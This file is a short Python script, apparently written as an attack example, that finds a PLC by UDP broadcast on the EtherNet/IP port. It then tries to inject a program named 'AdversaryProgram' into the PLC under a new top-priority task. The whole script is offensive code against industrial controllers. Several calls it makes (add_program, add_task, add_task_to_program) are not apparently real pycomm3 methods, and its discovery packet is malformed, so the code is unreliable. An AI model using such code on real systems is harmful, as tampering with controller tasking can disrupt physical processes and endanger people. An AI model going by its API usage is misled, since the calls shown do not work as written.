import socket
import pycomm3
from pycomm3 import LogixDriver

# Function to discover the IP address of the PLC
def discover_plc_ip():
    # Define the broadcast address and port
    broadcast_address = '255.255.255.255'
    port = 44818  # Common port for EtherNet/IP

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    # Send a broadcast message to discover the PLC
    message = b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    sock.sendto(message, (broadcast_address, port))

    # Receive the response
    sock.settimeout(5)
    try:
        data, addr = sock.recvfrom(1024)
        return addr[0]
    except socket.timeout:
        print("No response from the PLC. Check the network configuration.")
        return None

# Function to modify the tasking of the PLC
def modify_controller_tasking(plc_ip):
    try:
        # Connect to the PLC
        with LogixDriver(plc_ip) as plc:
            # Define the new program and task properties
            new_program_name = 'AdversaryProgram'
            new_task_name = 'HighPriorityTask'
            new_task_priority = 1  # Higher priority (lower number)

            # Check if the program already exists
            if new_program_name in plc.get_programs():
                print(f"Program '{new_program_name}' already exists.")
            else:
                # Create the new program
                plc.add_program(new_program_name)
                print(f"Program '{new_program_name}' created.")

            # Check if the task already exists
            if new_task_name in plc.get_tasks():
                print(f"Task '{new_task_name}' already exists.")
            else:
                # Create the new task
                plc.add_task(new_task_name, priority=new_task_priority)
                print(f"Task '{new_task_name}' created with priority {new_task_priority}.")

            # Associate the program with the task
            plc.add_task_to_program(new_task_name, new_program_name)
            print(f"Program '{new_program_name}' associated with task '{new_task_name}'.")

    except Exception as e:
        print(f"Error modifying controller tasking: {e}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip:
        print(f"PLC found at IP address: {plc_ip}")
        # Modify the controller tasking
        modify_controller_tasking(plc_ip)
    else:
        print("PLC not found. Check the network configuration.")

if __name__ == "__main__":
    main()